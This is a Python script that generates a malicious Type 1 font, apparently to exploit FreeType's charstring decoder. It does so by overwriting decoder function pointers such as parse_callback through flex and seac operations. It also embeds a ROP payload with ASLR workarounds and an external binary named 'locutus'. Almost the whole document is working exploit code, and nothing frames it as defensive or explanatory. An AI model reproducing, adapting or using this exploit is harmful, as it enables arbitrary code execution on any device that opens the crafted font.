# 0    0x70: stack
# 256 0x470: top
# ...
# 313 0x554: num_subrs
# 314 0x558: subrs
# ...
# 337 0x5b4: ?
# 338 0x5b8: blend
# 339 0x5bc: hint_mode
# 340 0x5c0: parse_callback
# 341 0x5c4: funcs.init
# 342 0x5c8: funcs.done
# 343 0x5cc: funcs.parse_charstrings = t1_decoder_parse_charstrings
# 344 0x5d0: buildchar = <heap>
# 345 0x5d4: len_buildchar = 3
# 346 0x5d8: seac = 0
# 347 0x5dc: ?
# 348 0x5e0: ? = 0x208
# 349 0x5e4: ? = 0
# 350 0x5e8: ? = 0
# 351 0x5ec: ? = t1_driver_class

# first overwrite funcs.done and funcs.parse_charstrings using end flex
# then use THAT to overwrite hint_mode and parse_callback
# then use seac, which will call parse_callback(decoder, glyph idx)

# BuildCharArray:
# 0: top (used for decoder offset)
# 1: parse_callback (used to work around ASLR)
#    later, parse_callback - expected
# 2: buildchar (used for buildchar offset, duh!)
# 3: idx
# 4: [start of data]


import struct
import cPickle as pickle

stuff = [pickle.load(open('../goo/catalog/catalog.txt')), pickle.load(open('../goo/catalog/catalog.txt'))]

def xrepr(number, large_int):
    number %= (2**32)
    if number >= (2**31): number -= (2**32)
    large_int_2 = not (-32000 <= number <= 32000)
    if large_int and not large_int_2:
        raise Exception('xrepr: nope (%x)' % number)
    return str(number), large_int_2

def xrepr_to_small(number, large_int):
    sd, large_int = xrepr(number, large_int)
    if large_int:
        sd += ' dotsection'
    return sd

def xrepr_to_large(number, large_int):
    sd, large_int = xrepr(number, large_int)
    assert large_int
    return sd

def xrepr_plus_small(number, large_int, numbers2):
    sd, large_int = xrepr(number, large_int)
    if large_int:
        numbers2 = [i << 16 for i in numbers2]
    return sd + ''.join(' ' + str(i) for i in numbers2)

def encode_unknown(s):
    result = ''
    for char in str(s):
        result += 'UNKNOWN_%d ' % ord(char)
    return result

subrs = {}

# this is read by the ROP stuff
subr0 = open('../locutus/locutus').read()
stuff[0]['plist_offset'] = len(subr0)
subr0 += stuff[0]['plist']
stuff[1]['plist_offset'] = len(subr0)
subr0 += stuff[1]['plist']

subrs[0] = encode_unknown(subr0)

# start flex
subrs[3] = '0 1 callothersubr ' + '0 2 callothersubr '*7 + 'return'

# set word at pos, increment pos
subrs[4] = '''dotsection
                3 1 25 callothersubr    % load index
                  2 24 callothersubr    % store value there
              3 1 25 callothersubr      % load index again
                1 2 20 callothersubr    % add one
                3 2 24 callothersubr    % store index
                return
                '''

# add the dyld cache offset at 1, and call 4
subrs[5] = '''  1 1 25
                  2 20 callothersubr
              4 callsubr
              return
              '''

# add the decoder offset at 0, and call 4
subrs[6] = '''  0 1 25
                  2 20 callothersubr
              4 callsubr
              return
              '''

# add the code offset at 2, and call 4
subrs[7] = '''  2 1 25
                  2 20 callothersubr
              4 callsubr
              return
              '''

main = '''3 0 setcurrentpoint
          3 callsubr           % prepare for the first run up
          -347 42 callothersubr
          callothersubr        % now at 344
          hmoveto hmoveto hmoveto
          setcurrentpoint      % hint_mode and parse_callback
                               % now at 339; want to get to 257 so we capture top
          hstem3 hstem3 hstem3 hstem3
          hstem3 hstem3 hstem3 hstem3
          hstem3 hstem3 hstem3 hstem3
          hstem3 UNKNOWN_15 UNKNOWN_15 hmoveto
                               % now x is blend, and y is parse_callback; come back down a little
          hstem3 hstem3
          3 callsubr           % start flex so we can get x and y
          0 0 0 3 0 callothersubr 

          1 2 24 callothersubr % parse_callback -> bca[1]
          0 2 24 callothersubr % top -> bca[0]

          -102 42 callothersubr % back up to get buildchar
          setcurrentpoint       % now at 344

          hstem3 hstem3 hstem3 hstem3
          hstem3 hstem3 hstem3 hstem3
          hstem3 hstem3 hstem3 hstem3
          hstem3 hstem3 hstem3
          
          254 42 callothersubr
          
          3 callsubr           % flex again
          0 0 0 3 0 callothersubr 
          2 2 24 callothersubr % buildchar -> bca[2]

          4 3 2 24 callothersubr % 4 -> bca[3]

          1 2 0
                1 1 25 callothersubr       % first
                  1 1 25 callothersubr     % second
                    2 div                  % / 2
                    2 2 22 callothersubr   % * 2
                    2 21 callothersubr     % x - ((x / 2) * 2)

                  4 27 callothersubr     % 0 <= it ? 1 : 2
            callsubr                     % call 1 or 2
            % the subr should push stuff, set y to an appropriate parse_callback, start flex, then go up to 344
          '''

stack_400_loc = 20

subrno = 1
for data in stuff:
    stub = data['final']
    stub += '\0' * (-len(stub) & 3)
    stub = list(struct.unpack('I'*(len(stub)/4), stub))
    print hex(data['parse_callback'])
    assert data['parse_callback'] > 32000
    assert data['actual_parse_callback'] > 32000
    
    subr = '''1 1 25 callothersubr             %% get parse_callback
              %s 2 21 callothersubr            %% subtract the real one
              1 2 24 callothersubr             %% store back
              -%d 42 callothersubr             %% go up to where we will start popping
              ''' % (xrepr_to_small(data['actual_parse_callback'], False), stack_400_loc)
           
    subr += '0 %s setcurrentpoint ' % xrepr(data['parse_callback'], False)[0]
    i = 0
    for number in stub:
        r = data['relocs'].get(i, 0)
        i += 4
        #print hex(number)
        if r == 0xc: # plist offset in the subr
            number += data['plist_offset']
        elif r == 0xd: # code offset
            subr += xrepr_plus_small(number + 4*4, False, [7]) + ' callsubr '
            continue
        elif r == 0xe: # decoder offset
            subr += xrepr_plus_small(number - 0x70 - 257*4, False, [6]) + ' callsubr '
            continue
        elif r == 3: # dyld cache
            subr += xrepr_plus_small(number, False, [5]) + ' callsubr '
            continue
        else:
            assert r == 0
        subr += xrepr_plus_small(number, False, [4]) + ' callsubr '
    subr += 'dotsection 3 callsubr %d 42 callothersubr return' % -(344 - stack_400_loc - len(stub))

    subrs[subrno] = subr
    subrno += 1

main += '''
           callothersubr
           hstem3 hstem3 hstem3 hstem3
           hstem3 hstem3 hstem3 hstem3
           hstem3 hstem3 hstem3 hstem3
           hstem3 hstem3 hstem3

           0 0 0 64 64 seac % 64 = @
           endchar          % unnecessary if it worked'''

subrs['main'] = main

num_bca = 3 << 16 

template = open('dejavu.raw.template').read()
template = template.replace('%BCA%', ('0 ' * num_bca)[:-1])
template = template.replace('%THEPROGRAM%', subrs['main'])
template = template.replace('%NUMSUBRS%', '%d' % (len(subrs) - 1))
subrtext = ''
for num, subr in subrs.iteritems():
    if num == 'main': continue
    subrtext += 'dup %d {\n\t%s\n\t} put\n' % (num, subr)
template = template.replace('%SUBRS%', subrtext)

open('dejavu.raw', 'w').write(template)
